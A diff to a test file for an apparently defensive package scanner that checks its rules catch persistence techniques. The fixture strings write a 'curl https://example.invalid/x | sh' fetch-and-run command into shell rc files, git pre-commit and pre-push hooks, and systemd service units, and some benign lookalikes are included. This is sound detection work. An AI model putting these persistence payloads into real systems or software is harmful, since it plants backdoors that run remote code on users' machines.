@@ -461,6 +461,11 @@ cat >> /tmp/.bashrc <<'EOF'
 curl https://example.invalid/x | sh
 EOF
 """,
+        "rc_backup_lookalike.sh": """\
+cat >> ~/.bashrc.backup <<'EOF'
+curl https://example.invalid/x | sh
+EOF
+""",
         "launchd.sh": """\
 cat > ~/Library/LaunchAgents/com.demo.update.plist <<'EOF'
 <key>ProgramArguments</key>
@@ -564,3 +569,60 @@ with open('.config/autostart/update.desktop', 'a+', encoding='utf-8') as handle:
     }
     findings = _opengrep(make_package, files)
     assert {finding.path for finding in findings} == set(files)
+
+
+def test_persistence_sinks_detect_r_plus_update_modes(make_package):
+    files = {
+        "hook.py": """\
+with open('.git/hooks/pre-commit', 'r+') as handle:
+    handle.write('curl https://example.invalid/x | sh')
+""",
+        "rc.py": """\
+import os
+target = os.path.expanduser('~/.zshrc')
+with open(target, 'r+') as handle:
+    handle.write('curl https://example.invalid/x | sh')
+""",
+    }
+    findings = _opengrep(make_package, files)
+    assert {finding.path for finding in findings if finding.vector == "SXV-039"} == set(files)
+
+
+def test_bash_systemd_and_git_hook_persistence(make_package):
+    files = {
+        "systemd_heredoc.sh": (
+            "cat > ~/.config/systemd/user/update.service <<'EOF'\n"
+            "[Service]\n"
+            'ExecStart=/bin/sh -c "curl https://example.invalid/x | sh"\n'
+            "EOF\n"
+        ),
+        "systemd_inline.sh": (
+            "printf '%b' '[Service]\\nExecStart=/bin/sh -c \"curl "
+            "https://example.invalid/x | sh\"' > /etc/systemd/system/update.service\n"
+        ),
+        "git_hook_inline.sh": (
+            "echo 'curl https://example.invalid/x | sh' > .git/hooks/pre-commit\n"
+        ),
+        "git_hook_heredoc.sh": (
+            "cat > .git/hooks/pre-push <<'EOF'\n"
+            "#!/bin/sh\n"
+            "curl https://example.invalid/x | sh\n"
+            "EOF\n"
+        ),
+        "systemd_benign.sh": (
+            "cat > ~/.config/systemd/user/backup.service <<'EOF'\n"
+            "[Service]\n"
+            "ExecStart=/usr/bin/backup\n"
+            "EOF\n"
+        ),
+        "hook_sample.sh": (
+            "echo 'curl https://example.invalid/x | sh' > .git/hooks/pre-commit.sample\n"
+        ),
+    }
+    findings = _opengrep(make_package, files)
+    assert {(f.path, f.rule) for f in findings if f.vector == "SXV-039"} == {
+        ("systemd_heredoc.sh", "opengrep-systemd-persistence"),
+        ("systemd_inline.sh", "opengrep-systemd-persistence"),
+        ("git_hook_inline.sh", "opengrep-git-hook-persistence"),
+        ("git_hook_heredoc.sh", "opengrep-git-hook-persistence"),
+    }
